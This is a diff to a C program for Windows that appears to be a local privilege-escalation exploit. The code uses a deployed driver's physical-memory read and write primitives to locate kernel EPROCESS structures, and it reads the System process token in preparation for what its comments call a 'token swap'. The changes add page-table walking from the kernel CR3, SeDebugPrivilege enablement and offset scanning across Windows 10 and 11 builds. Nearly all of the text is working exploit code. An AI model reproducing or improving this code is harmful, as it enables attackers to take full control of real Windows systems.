@@ -134,6 +134,78 @@ static int phys_write(uint64_t pa, const void *data, uint32_t sz)
     return ok;
 }
 
+/* ── CR3-based fast EPROCESS lookup ────────────────────────────────────── */
+static uint64_t g_kernel_cr3 = 0;
+
+static uint64_t kva_to_pa(uint64_t cr3, uint64_t va)
+{
+    uint64_t e = 0;
+    if (!phys_read((cr3 & ~0xFFFULL) | ((va >> 39 & 0x1FF) << 3), &e, 8) || !(e & 1)) return 0;
+    if (!phys_read((e & 0x000FFFFFFFFFF000ULL) | ((va >> 30 & 0x1FF) << 3), &e, 8) || !(e & 1)) return 0;
+    if (e & 0x80) return (e & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFF);
+    if (!phys_read((e & 0x000FFFFFFFFFF000ULL) | ((va >> 21 & 0x1FF) << 3), &e, 8) || !(e & 1)) return 0;
+    if (e & 0x80) return (e & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFF);
+    if (!phys_read((e & 0x000FFFFFFFFFF000ULL) | ((va >> 12 & 0x1FF) << 3), &e, 8) || !(e & 1)) return 0;
+    return (e & 0x000FFFFFFFFFF000ULL) | (va & 0xFFF);
+}
+
+/* Fast path: use SystemExtendedHandleInformation (0x40) to get kernel EPROCESS
+ * VA for a PID, then translate to PA via page tables. ~5 IOCTLs vs millions. */
+static uint64_t fast_find_eprocess_pa(uint32_t target_pid)
+{
+    if (!g_kernel_cr3) return 0;
+
+    typedef LONG (WINAPI *NtQSI_t)(ULONG, PVOID, ULONG, PULONG);
+    NtQSI_t fn = (NtQSI_t)GetProcAddress(GetModuleHandleA("ntdll.dll"),
+                                          "NtQuerySystemInformation");
+    if (!fn) return 0;
+
+    HANDLE hProc = (target_pid == GetCurrentProcessId())
+        ? GetCurrentProcess()
+        : OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, target_pid);
+    if (!hProc) return 0;
+
+    typedef struct {
+        PVOID     Object; ULONG_PTR UniqueProcessId; ULONG_PTR HandleValue;
+        ULONG     GrantedAccess; USHORT CBI; USHORT OTI; ULONG HA; ULONG Res;
+    } SHI_EX_E;
+    typedef struct { ULONG_PTR Count; ULONG_PTR Reserved; SHI_EX_E Handles[1]; } SHI_EX;
+
+    ULONG sz = 0x80000; SHI_EX *shi = NULL; LONG st;
+    do { free(shi); shi = (SHI_EX*)malloc(sz *= 2); if (!shi) break;
+         st = fn(0x40, shi, sz, NULL);
+    } while (st == (LONG)0xC0000004L);
+
+    if (!shi) { if (hProc != GetCurrentProcess()) CloseHandle(hProc); return 0; }
+
+    DWORD my_pid = GetCurrentProcessId();
+    uint64_t eproc_kva = 0;
+    for (ULONG_PTR i = 0; i < shi->Count; i++) {
+        if ((DWORD)shi->Handles[i].UniqueProcessId != my_pid) continue;
+        if (shi->Handles[i].HandleValue != (ULONG_PTR)hProc) continue;
+        eproc_kva = (uint64_t)(uintptr_t)shi->Handles[i].Object;
+        break;
+    }
+    free(shi);
+    if (hProc != GetCurrentProcess()) CloseHandle(hProc);
+
+    if (!eproc_kva || (eproc_kva >> 48) != 0xFFFF) return 0;
+
+    uint64_t pa = kva_to_pa(g_kernel_cr3, eproc_kva);
+    if (!pa) return 0;
+
+    /* Validate: read PID back from derived PA before any write */
+    uint64_t pid_check = 0;
+    if (!phys_read(pa + OFF_PID, &pid_check, 8) || pid_check != target_pid) {
+        printf("  [!] fast_find PA=0x%llX PID readback=%llu (expected %u) — discarded\n",
+               (unsigned long long)pa, (unsigned long long)pid_check, target_pid);
+        return 0;
+    }
+    printf("  [+] Fast EPROCESS PA=0x%016llX (VA=0x%016llX)\n",
+           (unsigned long long)pa, (unsigned long long)eproc_kva);
+    return pa;
+}
+
 /* ══════════════════════════════════════════════════════════════════════════
    DRIVER DEPLOYMENT
    ══════════════════════════════════════════════════════════════════════════ */
@@ -199,16 +271,52 @@ typedef struct { HANDLE S; PVOID MB; PVOID IB; ULONG IS; ULONG F;
                  USHORT L,I,Lc,O; CHAR P[256]; } MOD;
 typedef struct { ULONG C; MOD M[1]; } MODLIST;
 
+static void enable_debug_priv(void)
+{
+    HANDLE tok = NULL;
+    if (!OpenProcessToken(GetCurrentProcess(),
+                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok)) return;
+    TOKEN_PRIVILEGES tp = {1};
+    if (LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &tp.Privileges[0].Luid))
+        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+    AdjustTokenPrivileges(tok, FALSE, &tp, sizeof tp, NULL, NULL);
+    CloseHandle(tok);
+}
+
 static uint64_t get_ntoskrnl_va(void)
 {
+    enable_debug_priv();
+
     PFN_NTQSI fn = (PFN_NTQSI)GetProcAddress(
         GetModuleHandleA("ntdll"), "NtQuerySystemInformation");
-    if (!fn) return 0;
-    ULONG sz = 0; fn(11, NULL, 0, &sz); sz += 4096;
-    MODLIST *ml = (MODLIST*)malloc(sz);
-    if (!ml) return 0;
-    fn(11, ml, sz, NULL);
-    uint64_t va = (uint64_t)ml->M[0].IB;
+    if (!fn) { printf("  [-] GetProcAddress(NtQuerySystemInformation) failed\n"); return 0; }
+
+    /* Retry loop: start at 128KB, double until it fits */
+    ULONG sz = 0x20000;
+    MODLIST *ml = NULL;
+    NTSTATUS st = 0;
+    do {
+        free(ml);
+        ml = (MODLIST*)malloc(sz *= 2);
+        if (!ml) return 0;
+        st = fn(11, ml, sz, NULL);
+    } while (st == (NTSTATUS)0xC0000004L); /* STATUS_INFO_LENGTH_MISMATCH */
+
+    if (st != 0 || !ml || !ml->C) {
+        printf("  [-] NtQuerySystemInformation(11) status=0x%08lX (count=%lu)\n",
+               (unsigned long)st, ml ? (unsigned long)ml->C : 0UL);
+        free(ml);
+        return 0;
+    }
+
+    uint64_t va = 0;
+    for (ULONG i = 0; i < ml->C; i++) {
+        const char *nm = ml->M[i].P + ml->M[i].O;
+        if (_stricmp(nm, "ntoskrnl.exe") == 0 || _stricmp(nm, "ntkrnlmp.exe") == 0) {
+            va = (uint64_t)ml->M[i].IB;
+            break;
+        }
+    }
     free(ml);
     return va;
 }
@@ -322,46 +430,84 @@ static uint64_t find_ntoskrnl_pa(uint64_t nt_va)
 /* ══════════════════════════════════════════════════════════════════════════
    EPROCESS SCAN
    ══════════════════════════════════════════════════════════════════════════ */
+
+/* ImageFileName offsets to try — Win10 21H2 through Win11 24H2 */
+static const uint32_t s_name_offsets[] = { 0x5A8, 0x5B0, 0x5B8, 0x5C0 };
+#define N_NAME_OFFSETS ((int)(sizeof s_name_offsets / sizeof s_name_offsets[0]))
+
+static int name_valid(const uint8_t *nb, const char *expect)
+{
+    /* Must start with a printable char and be null-terminated within 15 chars */
+    if (!nb[0] || nb[0] < 0x20 || nb[0] > 0x7E) return 0;
+    for (int j = 1; j < 15; j++) {
+        if (!nb[j]) break;
+        if (nb[j] < 0x20 || nb[j] > 0x7E) return 0;
+    }
+    if (expect && _strnicmp((const char*)nb, expect, strlen(expect)) != 0) return 0;
+    return 1;
+}
+
 static uint64_t find_eprocess_by_pid(uint32_t target_pid)
 {
+    const char *tname = (target_pid == 4) ? "System" : NULL;
     uint8_t page[0x1000];
     uint64_t candidates = 0, last_prog = 0;
+
+    /* Need to fit at least: DTB(+0x28+8), PID(+0x440+8), Blink(+0x450+8) in page */
+    const int SUB_MAX = 0x1000 - 0x458; /* = 0xBA8 */
 
     for (int ri = 0; ri < g_nranges; ri++) {
         uint64_t end = g_ranges[ri].base + g_ranges[ri].size;
         for (uint64_t pa = g_ranges[ri].base; pa + 0x1000 <= end; pa += 0x1000) {
             if (pa - last_prog >= 0x40000000ULL) {
                 printf("  [scan] %5llu MB  candidates=%llu\n",
-                       (unsigned long long)(pa>>20),
+                       (unsigned long long)(pa >> 20),
                        (unsigned long long)candidates);
                 last_prog = pa;
             }
             if (!phys_read(pa, page, sizeof page)) continue;
 
-            for (int off = 0; off + 8 <= 0x1000; off += 8) {
-                if (memcmp(page + off, "System\0\0", 6) &&
-                    memcmp(page + off, "svchost\0", 7) &&
-                    /* Match any process name at EPROCESS+OFF_NAME */
-                    page[off] < 0x20) continue;
+            for (int sub = 0; sub <= SUB_MAX; sub += 0x10) {
+                /* PID must match exactly (QWORD) */
+                uint64_t pid;
+                memcpy(&pid, page + sub + OFF_PID, 8);
+                if (pid != (uint64_t)target_pid) continue;
 
-                uint64_t eproc_pa = pa + (uint64_t)off - OFF_NAME;
-                if (!pa_in_range(eproc_pa, OFF_NAME + 16)) continue;
+                /* DTB: page-aligned and realistic (>64KB) */
+                uint64_t cr3;
+                memcpy(&cr3, page + sub + OFF_DTB, 8);
+                if (!cr3 || (cr3 & 0xFFF) || cr3 < 0x10000) continue;
 
-                uint8_t ep[OFF_NAME + 16];
-                if (!phys_read(eproc_pa, ep, sizeof ep)) continue;
+                /* ActiveProcessLinks Flink/Blink: must be canonical kernel VAs */
+                uint64_t flink, blink;
+                memcpy(&flink, page + sub + 0x448, 8);
+                memcpy(&blink, page + sub + 0x450, 8);
+                if ((flink >> 48) != 0xFFFF) continue;
+                if ((blink >> 48) != 0xFFFF) continue;
 
-                uint64_t pid = *(uint64_t*)(ep + OFF_PID);
-                if (pid != target_pid) continue;
-                if (memcmp(ep + OFF_NAME, page + off, 6) != 0) continue;
+                /* ImageFileName: try multiple offsets */
+                uint64_t eproc_pa = pa + (uint64_t)sub;
+                for (int ni = 0; ni < N_NAME_OFFSETS; ni++) {
+                    uint32_t noff = s_name_offsets[ni];
+                    uint8_t nbuf[16] = {0};
+                    if (!phys_read(eproc_pa + noff, nbuf, 15)) continue;
+                    if (!name_valid(nbuf, tname)) continue;
 
-                candidates++;
-                uint64_t cr3 = *(uint64_t*)(ep + OFF_DTB);
-                if (!cr3 || (cr3 & 0xFFF)) continue;
-
-                return eproc_pa;
+                    printf("  [+] EPROCESS PA=0x%012llX  PID=%llu  name=%.15s"
+                           "  DTB=0x%llX  off_name=+0x%X\n",
+                           (unsigned long long)eproc_pa,
+                           (unsigned long long)pid,
+                           (char*)nbuf,
+                           (unsigned long long)cr3,
+                           noff);
+                    candidates++;
+                    return eproc_pa;
+                }
             }
         }
     }
+    printf("  [-] EPROCESS not found (scanned, candidates=%llu)\n",
+           (unsigned long long)candidates);
     return 0;
 }
 
@@ -399,22 +545,27 @@ int main(void)
     }
     printf("  [+] %d ranges\n", g_nranges);
 
-    /* 4. ntoskrnl VA */
+    /* 4. ntoskrnl VA — informational only, not required for token swap */
     printf("\n[4] ntoskrnl VA (NtQuerySI)...\n");
     uint64_t nt_va = get_ntoskrnl_va();
-    if (!nt_va) { printf("  [-] Failed\n"); CloseHandle(g_dev); return 1; }
-    printf("  [+] ntoskrnl VA = 0x%016llX\n", (unsigned long long)nt_va);
+    if (!nt_va)
+        printf("  [!] ntoskrnl VA unavailable — skipping PA scan (steps 4-5 optional)\n");
+    else
+        printf("  [+] ntoskrnl VA = 0x%016llX\n", (unsigned long long)nt_va);
 
-    /* 5. ntoskrnl PA */
-    printf("\n[5] Scanning for ntoskrnl PA (2MB step)...\n");
-    uint64_t nt_pa = find_ntoskrnl_pa(nt_va);
-    if (!nt_pa) {
-        printf("  [-] ntoskrnl PA not found\n");
-        CloseHandle(g_dev); return 1;
+    /* 5. ntoskrnl PA — informational only */
+    if (nt_va) {
+        printf("\n[5] Scanning for ntoskrnl PA (2MB step)...\n");
+        uint64_t nt_pa = find_ntoskrnl_pa(nt_va);
+        if (nt_pa)
+            printf("  [+] ntoskrnl PA = 0x%016llX (VA-to-PA delta: 0x%llX)\n",
+                   (unsigned long long)nt_pa,
+                   (unsigned long long)(nt_pa - nt_va));
+        else
+            printf("  [!] ntoskrnl PA scan failed — continuing\n");
+    } else {
+        printf("\n[5] Skipping ntoskrnl PA scan (no VA)\n");
     }
-    printf("  [+] ntoskrnl PA = 0x%016llX\n", (unsigned long long)nt_pa);
-    printf("  PA formula: target_PA = 0x%llX + (target_VA - 0x%llX)\n\n",
-           (unsigned long long)nt_pa, (unsigned long long)nt_va);
 
     /* 6. Find System EPROCESS */
     printf("[6] Scanning for System EPROCESS (PID=4)...\n");
@@ -426,6 +577,16 @@ int main(void)
     printf("  [+] System EPROCESS PA = 0x%016llX\n",
            (unsigned long long)sys_eproc_pa);
 
+    /* Extract kernel CR3 from System EPROCESS DTB */
+    { uint64_t dtb = 0;
+      phys_read(sys_eproc_pa + OFF_DTB, &dtb, 8);
+      if (dtb && !(dtb & 0xFFF) && dtb > 0x10000) {
+          g_kernel_cr3 = dtb;
+          printf("  [+] Kernel CR3         = 0x%016llX\n",
+                 (unsigned long long)g_kernel_cr3);
+      }
+    }
+
     /* Read System Token */
     uint64_t system_token = 0;
     if (!phys_read(sys_eproc_pa + OFF_TOKEN, &system_token, 8)) {
@@ -435,10 +596,14 @@ int main(void)
     printf("  [+] System Token       = 0x%016llX\n",
            (unsigned long long)system_token);
 
-    /* 7. Find current process EPROCESS */
+    /* 7. Find current EPROCESS — fast CR3 path first, scan fallback */
     uint32_t my_pid = GetCurrentProcessId();
-    printf("\n[7] Scanning for current EPROCESS (PID=%u)...\n", my_pid);
-    uint64_t my_eproc_pa = find_eprocess_by_pid(my_pid);
+    printf("\n[7] Finding current EPROCESS (PID=%u)...\n", my_pid);
+    uint64_t my_eproc_pa = fast_find_eprocess_pa(my_pid);
+    if (!my_eproc_pa) {
+        printf("  [~] Fast path failed — falling back to full scan\n");
+        my_eproc_pa = find_eprocess_by_pid(my_pid);
+    }
     if (!my_eproc_pa) {
         printf("  [-] Current EPROCESS not found\n");
         CloseHandle(g_dev); return 1;
